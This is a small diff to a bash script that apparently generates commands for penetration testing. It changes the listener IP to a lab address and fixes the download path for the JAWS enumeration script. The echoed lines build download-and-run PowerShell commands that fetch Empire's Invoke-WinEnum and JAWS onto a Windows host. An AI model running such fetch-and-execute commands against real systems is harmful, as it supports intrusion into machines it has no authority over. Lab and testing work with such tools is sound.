@@ -8,7 +8,7 @@ set -o pipefail
 # Variables                                                                    #
 ################################################################################
 
-LocalIP="0.0.0.0";		#
+LocalIP="10.10.10.6";		#
 LocalPort="8080";		#
 
 Username="";			#
@@ -768,7 +768,7 @@ echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
 echo -e ""
 echo -e "${IBLUE}JAWS${RESTORE}"
-echo -e "$DownloadMethod "$JAWSRepo"/blob/master/jaws-enum.ps1);JAWS-ENUM"
+echo -e "$DownloadMethod "$JAWSRepo"jaws-enum.ps1);JAWS-ENUM"
 echo -e ""
 echo -e ""
 # Network Enumeration
